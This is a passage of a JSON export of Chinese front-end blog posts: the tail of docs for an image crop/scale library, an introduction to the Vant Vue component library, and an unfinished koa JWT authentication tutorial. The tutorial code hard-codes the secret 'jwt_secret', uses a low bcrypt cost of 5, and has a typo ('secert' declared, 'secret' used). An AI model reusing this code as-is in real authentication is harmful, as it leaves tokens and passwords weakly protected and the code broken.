class=\"hljs js\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e base64 = cropImage.getClipImgData();\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003erotate\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e旋转图片\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003ecropImage.clip(isClockWise);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003edestroy\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e销毁当前的裁剪对象\u003c/p\u003e\n\u003cp\u003e如果一个容器需要重新生成裁剪对象，一定要先销毁以前的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003ecropImage.destroy();\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e更多\u003c/h3\u003e\u003cp\u003e关于详细参数说明与更多使用\u003c/p\u003e\n\u003cp\u003e请参考\u003ccode\u003e源码\u003c/code\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e图像缩放\u003c/h2\u003e\u003cp\u003e上述的图片裁剪中其实已经附带缩放功能，但是鉴于那是基于整套裁剪流程的，不满足一些场景（譬如只要针对图片压缩的）。\u003c/p\u003e\n\u003cp\u003e因此，单独又将图像缩放提取成一个模块，以适用于此类场景。\u003c/p\u003e\n\u003cp\u003e功能包括：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003e图像的缩放、压缩\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e一些常用的缩放算法（双立方，双线性，近邻）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e示例\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://dailc.github.io/image-process/examples/scale.html\"\u003ehttps://dailc.github.io/image-process/examples/scale.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://dailc.github.io/image-process/examples/scale_compress.html\"\u003ehttps://dailc.github.io/image-process/examples/scale_compress.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/11/16/15fc2c418f1f99c6?w=334\u0026h=335\u0026f=jpeg\u0026s=23208\"\u003e\u003cfigcaption\u003eimage\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e效果\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003e示例较为粗糙\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/11/16/15fc2c41b83d8a19?w=334\u0026h=886\u0026f=jpeg\u0026s=40626\"\u003e\u003cfigcaption\u003eimage\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用\u003c/h3\u003e\u003cp\u003e引入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003edist/image-scale.js\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e全局变量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003eImageScale\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e调用方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003eImageScale.method()\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAPI\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003escaleImageData\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e对\u003ccode\u003eImageData\u003c/code\u003e类型的数据进行缩放，将数据放入新的\u003ccode\u003eImageData\u003c/code\u003e中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003eImageScale.scaleImageData(imageData, newImageData, {\n    \u003cspan class=\"hljs-comment\"\u003e// 0: nearestNeighbor\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 1: bilinearInterpolation\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 2: bicubicInterpolation\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 3: bicubicInterpolation2\u003c/span\u003e\n    processType: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\n});\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003escaleImage\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e对\u003ccode\u003eImage\u003c/code\u003e类型的对象进行缩放，返回一个\u003ccode\u003ebase64\u003c/code\u003e字符串\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e base64 = ImageScale.scaleImage(image, {\n    \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003emime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'image/png'\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// 0: nearestNeighbor\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 1: bilinearInterpolation\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 2: bicubicInterpolation\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 3: bicubicInterpolation2\u003c/span\u003e\n    processType: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\n});\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003ecompressImage\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003ecompressImage，返回一个\u003ccode\u003ebase64\u003c/code\u003e字符串\u003c/p\u003e\n\u003cp\u003e与scale的区别是这用的是canvas自动缩放，并且有很多参数可控\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e base64 = ImageScale.compressImage(image, {\n    \u003cspan class=\"hljs-comment\"\u003e// 压缩质量\u003c/span\u003e\n    quality: \u003cspan class=\"hljs-number\"\u003e0.92\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003emime\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'image/jpeg'\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// 压缩时的放大系数，默认为1，如果增大，代表图像的尺寸会变大(最大不会超过原图)\u003c/span\u003e\n    compressScaleRatio: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// ios的iPhone下主动放大一定系数以解决分辨率过小的模糊问题\u003c/span\u003e\n    iphoneFixedRatio: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// 是否采用原图像素（不会改变大小）\u003c/span\u003e\n    isUseOriginSize: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// 增加最大宽度，增加后最大不会超过这个宽度\u003c/span\u003e\n    maxWidth: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// 使用强制的宽度，如果使用，其它宽高比系数都会失效，默认整图使用这个宽度\u003c/span\u003e\n    forceWidth: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\n    \u003cspan class=\"hljs-comment\"\u003e// 同上，但是一般不建议设置，因为很可能会改变宽高比导致拉升，特殊场景下使用\u003c/span\u003e\n    forceHeight: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e,\n});\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e更多\u003c/h3\u003e\u003cp\u003e关于详细参数说明与更多使用\u003c/p\u003e\n\u003cp\u003e请参考\u003ccode\u003e源码\u003c/code\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e完善与不足\u003c/h2\u003e\u003cp\u003e虽然说一些注意的功能都已经实现，但是从细节角度考虑，还是有很多有待完善的地方的。\u003c/p\u003e\n\u003cp\u003e譬如，裁剪框的实现方式不优雅。\u003c/p\u003e\n\u003cp\u003e譬如，旋转不支持其它角度。\u003c/p\u003e\n\u003cp\u003e譬如，内部源码有待优化。\u003c/p\u003e\n\u003cp\u003e...\u003c/p\u003e\n\u003cp\u003e虽然说有计划未来某段时间重构，但考虑到实际的时间安排，可能得等到很后了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e源码\u003c/h2\u003e\u003cp\u003e图像裁剪：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/dailc/image-process/blob/master/src/clip/README.md\"\u003ehttps://github.com/dailc/image-process/blob/master/src/clip/README.md\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e图像缩放：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/dailc/image-process/blob/master/src/scale/README.md\"\u003ehttps://github.com/dailc/image-process/blob/master/src/scale/README.md\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514978819.5206","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556d7"},"id":"59cb19d95188257e84671938","author":{"$oid":"5a4cc287fa7d97296c4556bf"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Vant - 高效的 Vue 组件库，再造一个有赞移动商城也不在话下","meta":{"likeCount":0},"tag":["前端"],"comment":[],"shortContent":"Vant ( \\ˈvænt\\ ) 是有赞前端团队基于有赞统一的规范实现的 Vue 组件库，提供了一整套 UI 基础组件和业务组件。通过 Vant，可以快速搭建出风格统一的页面，提升开发效率。目前已有近50个组件，这些组件被广泛使用于有赞的各个移动端业务中。我们会在此基础上不断完…","content":"\u003cp\u003e\u003ca href=\"https://github.com/youzan/vant\"\u003eVant ( \\ˈvænt\\ )\u003c/a\u003e 是有赞前端团队基于有赞统一的规范实现的 Vue 组件库，提供了一整套 UI 基础组件和业务组件。通过 Vant，可以快速搭建出风格统一的页面，提升开发效率。目前已有近50个组件，这些组件被广泛使用于有赞的各个移动端业务中。我们会在此基础上不断完善，开发更多实用的组件。\u003c/p\u003e\n\u003cp\u003e我们的目标是更快、更简单开发基于 Vue 的美观易用的移动站点。如果你需要开发一个移动商城，用 Vant 就再合适不过了。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Vant 组件预览\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/b9a13a016c739ae5299cc84a1a5a9005\"\u003e\u003cfigcaption\u003eVant 组件预览\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e一、特性\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e组件都是来源于有赞的微商城业务，并且经过有赞业务的检验，更靠谱\u003c/li\u003e\n\u003cli\u003e完善详实的 \u003ca href=\"https://www.youzanyun.com/zanui/vue/component/quickstart\"\u003e中文文档\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e专门的设计师团队维护视觉规范，统一而优雅\u003c/li\u003e\n\u003cli\u003e支持 \u003ca href=\"https://github.com/ant-design/babel-plugin-import\"\u003ebabel-plugin-import\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e单测覆盖率超过90%\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e建议搭配 webpack，babel 使用 Vant，这样可以使用 webpack 提供的丰富插件和个性化配置。Vant 支持了 \u003ca href=\"https://github.com/ant-design/babel-plugin-import\"\u003ebabel-plugin-import\u003c/a\u003e，通过 babel 插件使用 Vant，可以优化代码体积，提高前端性能。\u003c/p\u003e\n\u003cp\u003eVant 提供了详细的文档，每个组件各个功能点都有详细的说明和代码示例。如果需要使用对应功能，直接复制文档上的代码即可。\u003c/p\u003e\n\u003cp\u003e当然，这些只能让 Vant 成为一个优秀的 Vue UI 组件。那么，Vant 相比其它 Vue UI 组件库的优势在哪里？\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e二、丰富实用的业务组件\u003c/h2\u003e\n\u003cp\u003eVant 不只是提供基础的UI组件，为了方便开发者快速构建移动商城，Vant 增加了许多移动商城内常用的业务组件。类似于\u003ca href=\"https://www.youzanyun.com/zanui/vue/examples/component/sku\"\u003esku选择\u003c/a\u003e，\u003ca href=\"https://www.youzanyun.com/zanui/vue/examples/component/coupon\"\u003e优惠券选择\u003c/a\u003e，\u003ca href=\"https://www.youzanyun.com/zanui/vue/examples/component/area\"\u003e省市县选择\u003c/a\u003e 等。\u003c/p\u003e\n\u003cp\u003eVant 之后会不断丰富业务组件。从下面的不完整规划图可以看到，我们会把适用于不同业务场景的组件进行整理，逐渐完善成一个大的电商商城组件体系。\u0008罗列的大部分组件都已经在整理，近期会补充到 Vant 中。\u003cbr\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Vant规划\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/fe840461fb10eca649f6fbbb4325daf5\"\u003e\u003cfigcaption\u003eVant规划\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 id=\"1-sku-\"\u003e1、SKU 选择组件\u003c/h3\u003e\n\u003cp\u003e在商品页，选择商品规格进行购买是一个常见的业务场景。商品可以有多层级多种类sku，再考虑常见的限购、库存展示、购买留言、sku对应展示图片等功能，整个商品规格选择过程会变得很复杂。Vant 提供的 Sku 组件，通过指定数据传入后，即可满足上述所有需求。\u003c/p\u003e\n\u003cp\u003e常见的购买过程中，数量选择只支持通过点按加减来更改购买数量。但是在需要大量购买的场景下，手动输入购买数量会更方便用户操作，我们将 Sku 组件的购买数量支持了用户直接输入数字。同时，在用户输入时，会根据限购数量自动判断是否可以购买，并进行购买数量调节。\u003c/p\u003e\n\u003cp\u003e商品留言方面，Sku 组件提供了各种形式的商品留言支持，包括身份证、文本、电话、日期、时间、邮件。支持必填商品留言的展示与校验。\u003cbr\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Sku组件展示\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/af83fd1712ab104f6fc102779bab788a\"\u003e\u003cfigcaption\u003eSku组件展示\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 id=\"2-area-\"\u003e2、Area 省市县选择\u003c/h3\u003e\n\u003cp\u003eVant 提供了常见的省市县选择功能，将指定数据格式的省市县列表数据传入后，即可展示。Area 支持少于三列的选择方式，参数 columnsNum 可指定 Area 需要展示的列数，满足特殊场景下，只需要选择省或者省市的情况。\u003c/p\u003e\n\u003cp\u003eArea 对外提供了 cancel，confirm 事件。开发者在代码中监听此事件，即可捕捉到用户的操作，并进行相应的处理。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Area 组件展示\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/42be72eca56e441e505f8fed9f1717fb\"\u003e\u003cfigcaption\u003eArea 组件展示\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 id=\"3-coupon-\"\u003e3、Coupon 优惠券选择器\u003c/h3\u003e\n\u003cp\u003e优惠券选择器提供了优惠券单元格和优惠券选择功能。\u003c/p\u003e\n\u003cp\u003e优惠券单元格只需传入优惠券列表和当前使用的优惠券即可正确展示。使用 editable 参数可以控制优惠券单元格是否展示右侧箭头，这个可以用于提醒用户能否切换优惠券。\u003c/p\u003e\n\u003cp\u003e优惠券选择模块功能较多。优惠券选择支持优惠码兑换功能，用户在填入优惠码以后，点击兑换，即会触发 exchange 事件。开发者在代码中监听此事件，可以实现自己的优惠码兑换。同时，优惠券选择列表支持优惠券可用和不可用的展示，对优惠券不同状态不同的展示，对用户更加友好。\u003c/p\u003e\n\u003cp\u003e在近期，优惠券选择器会支持开发者自由替换优惠券选择列表中，每项优惠券的展示方式。\u003cbr\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Coupon 组件展示\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/9eb654ab7f9e0bec9c923b09d18311f2\"\u003e\u003cfigcaption\u003eCoupon 组件展示\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 id=\"next-address\"\u003eNext: 地址选择大组件 Address\u003c/h3\u003e\n\u003cp\u003e近期，我们会发布地址选择组件，完善 Vant 组件在地址管理方面的功能。\u003cbr\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"Address 地址组件\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/9c39d7f10b412fdb98b725f0128c3eca\"\u003e\u003cfigcaption\u003eAddress 地址组件\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 id=\"demo\"\u003eDemo\u003c/h3\u003e\n\u003cp\u003e以下是一个基于 Vant 搭建的商城\u003cbr\u003e demo，数据通过mock，生成的完整的购物流程。搭配优惠促销活动和用户管理界面，一个简单的买家商城就完成了。\u003cbr\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"基于 Vant 快速搭建的商城 DEMO\" src=\"https://user-gold-cdn.xitu.io/2017/9/27/295fbc4cd937202da04186e17af2fb71\"\u003e\u003cfigcaption\u003e基于 Vant 快速搭建的商城 DEMO\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e三、展望\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/youzan/vant\"\u003eVant\u003c/a\u003e 现在还有很多不足。业务组件才刚起步，不够完善，需要补充更多业务组件到 Vant 中。缺乏英文文档以及对 flow / typescript 的支持。期望得到大家的批评和建议，一起建立一个更好的 Vant。\u003c/p\u003e\n\u003cp\u003e完整代码请移步 \u003ca href=\"https://github.com/youzan/vant\"\u003egithub\u003c/a\u003e，使用指南请移步\u003ca href=\"https://www.youzanyun.com/zanui/vue/component/quickstart\"\u003e文档网站\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e本文首发于\u003ca href=\"https://tech.youzan.com/vant-vue-component/\"\u003e有赞技术博客\u003c/a\u003e。\u003c/p\u003e\n","buildTime":"1514973442.8832","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556d8"},"id":"5a1ae1cdf265da431d3c6337","author":{"$oid":"5a4cc287fa7d97296c4556ba"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"koa 实现 jwt 认证","meta":{"likeCount":0},"tag":["API","koa","前端","Node.js"],"comment":[],"shortContent":"关于 Token 认证机制，这里不做更多解释。不清楚的可以看我的这篇文章：Web开发中常见的认证机制 jsonwebtoken - 用于生成token下发给浏览器，在 koa2 以后的版本不再提供 jsonwebtoken 的方法,所以需要另行安装。 该项目需要你已经装好 mo…","content":"\u003cp\u003e关于 Token 认证机制，这里不做更多解释。不清楚的可以看我的这篇文章：\u003ca href=\"https://chenhuichao.com/2017/03/13/fe/web-auth/\"\u003eWeb开发中常见的认证机制\u003c/a\u003e\u003cbr\u003eGitHub 地址：\u003ca href=\"https://github.com/superman66/koa-jwt-sample\"\u003ekoa-jwt-sample\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e所需库\u003c/h2\u003e\u003cul\u003e\n\u003cli\u003ebcrypt - 用于加密密码\u003c/li\u003e\n\u003cli\u003ekoa-jwt - jwt 中间件\u003c/li\u003e\n\u003cli\u003ejsonwebtoken - 用于生成token下发给浏览器，在 koa2 以后的版本不再提供 jsonwebtoken 的方法,所以需要另行安装。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e实现思路\u003c/h2\u003e\u003cp\u003e整个方案实现的流程和思路很清晰，大致分为下面几步：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e自定义 401 拦截中间件，用于拦截 token 不存在或者失效的情况\u003c/li\u003e\n\u003cli\u003e配置 koa-jwt\u003c/li\u003e\n\u003cli\u003e注册实现\u003c/li\u003e\n\u003cli\u003e登录实现\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e运行项目\u003c/h2\u003e\u003cp\u003e该项目需要你已经装好 mongodb，并启动。关于 mongodb 的配置见 \u003ccode\u003econfig/index.js\u003c/code\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm run start\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e该项目提供了三个 api\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e/api/register\u003c/li\u003e\n\u003cli\u003e/api/login\u003c/li\u003e\n\u003cli\u003e/api/users\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e其中 \u003ccode\u003e/api/register\u003c/code\u003e 和 \u003ccode\u003e/api/login\u003c/code\u003e 为 public api，无需token就能访问。\u003ccode\u003e/users\u003c/code\u003e 则为 private api，需要传入正确的 token 才能访问。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e自定义 401 handler\u003c/h3\u003e\u003cp\u003e使用了 \u003ccode\u003ekoa-jwt\u003c/code\u003e 中间件后，如果没有token，或者token失效，该中间件会给出对应的错误信息。如果没有自定义中间件的话，会直接将 \u003ccode\u003ekoa-jwt\u003c/code\u003e 暴露的错误信息直接返回给用户。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// server/middlewares/errorHandle.js\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e errorHandle = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ectx, next\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e next().catch(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (err.status === \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e) {\n      ctx.status = \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e;\n      ctx.body = {\n        \u003cspan class=\"hljs-attr\"\u003eerror\u003c/span\u003e: err.originalError ? err.originalError.message : err.message,\n      };\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      \u003cspan class=\"hljs-keyword\"\u003ethrow\u003c/span\u003e err;\n    }\n  });\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后在 \u003ccode\u003eindex.js\u003c/code\u003e 中使用该中间件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003eapp\n  .use(errorHandle)\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e使用 koa-jwt\u003c/h3\u003e\u003cp\u003e在 \u003ccode\u003eindex.js\u003c/code\u003e 中加入 \u003ccode\u003ekoa-jwt\u003c/code\u003e 中间件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e secert = \u003cspan class=\"hljs-string\"\u003e'jwt_secret'\u003c/span\u003e\n  app\n  .use(jwt({\n    secret,\n  }).unless({\n    \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: [\u003cspan class=\"hljs-regexp\"\u003e/\\/register/\u003c/span\u003e, /\\/login/],\n  }))\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中 \u003ccode\u003esecret\u003c/code\u003e 是用于加密的key，不局限于字符串，也可以是一个文件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// https://github.com/koajs/jwt#token-verification-exceptions\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e publicKey = fs.readFileSync(\u003cspan class=\"hljs-string\"\u003e'/path/to/public.pub'\u003c/span\u003e);\napp.use(jwt({ \u003cspan class=\"hljs-attr\"\u003esecret\u003c/span\u003e: publicKey }));\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eunless()\u003c/code\u003e 用于设置哪些 api 是不需要通过 token 验证的。也就是我们通常说的 public api，无需登录就能访问的 api。在这个例子中，设置了 \u003ccode\u003e/register\u003c/code\u003e 和 \u003ccode\u003e/login\u003c/code\u003e 两个 api 无需 token 检查。\u003c/p\u003e\n\u003cp\u003e在使用 \u003ccode\u003ekoa-jwt\u003c/code\u003e 后，所有的路由（除了 \u003ccode\u003eunless()\u003c/code\u003e 设置的路由除外）都会检查 \u003ccode\u003eHeader\u003c/code\u003e 首部中的  token，是否存在、是否有效。只有正确之后才能正确的访问。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e注册实现\u003c/h3\u003e\u003cp\u003e注册很简单，这里只是简单的将密码加密，将信息存入数据库。实际项目中，还需要对用户输入的字段进行验证。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e  \u003cspan class=\"hljs-comment\"\u003e/**\n   * you can register with\n   * curl -X POST http://localhost:3200/api/register  -H 'cache-control: no-cache' -H 'content-type: application/x-www-form-urlencoded'  -d 'username=superman2\u0026amp;password=123456'\n   */\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e register(ctx) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { body } = ctx.request;\n    \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!body.username || !body.password) {\n        ctx.status = \u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e;\n        ctx.body = {\n          \u003cspan class=\"hljs-attr\"\u003eerror\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e`expected an object with username, password but got: \u003cspan class=\"hljs-subst\"\u003e${body}\u003c/span\u003e`\u003c/span\u003e,\n        }\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n      }\n      body.password = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e bcrypt.hash(body.password, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e)\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e user = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e User.find({ \u003cspan class=\"hljs-attr\"\u003eusername\u003c/span\u003e: body.username });\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!user.length) {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e newUser = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e User(body);\n        user = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e newUser.save();\n        ctx.status = \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e;\n        ctx.body = {\n          \u003cspan class=\"hljs-attr\"\u003emessage\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'注册成功'\u003c/span\u003e,\n          user,\n        }\n      } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        ctx.status = \u003cspan class=\"hljs-number\"\u003e406\u003c/span\u003e;\n        ctx.body = {\n          \u003cspan class=\"hljs-attr\"\u003emessage\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'用户名已经存在'\u003c/span\u003e,\n        }\n      }\n    } \u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e (error) {\n      ctx.throw(\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e)\n    }\n  }\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e登录实现\u003c/h3\u003e\u003cp\u003e用户输入用户名和密码登录，如果用户名和密码正确的话，使用 \u003ccode\u003ejsonwebtoken.sign()\u003c/code\u003e 生成 token，并返回给客户端。客户端将token存储在本地存储，在每次的 HTTP 请求中，都将 token 添加在 HTTP Header \u003ccode\u003eAuthorazition: Bearer token\u003c/code\u003e 中。然后后端每次去验证该token的正确与否。只有token正确后才能访问到对应的资源。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"JavaScript\"\u003e  \u003cspan class=\"hljs-comment\"\u003e/** you can login with\n   * curl -X POST http://localhost:3200/api/login/ -H 'cache-control: no-cache' -H 'content-type: application/x-www-form-urlencoded' -d 'username=superman2\u0026amp;password=123456'\n   */\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e login(ctx) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { body } = ctx.request\n    \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e user = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e User.findOne({ \u003cspan 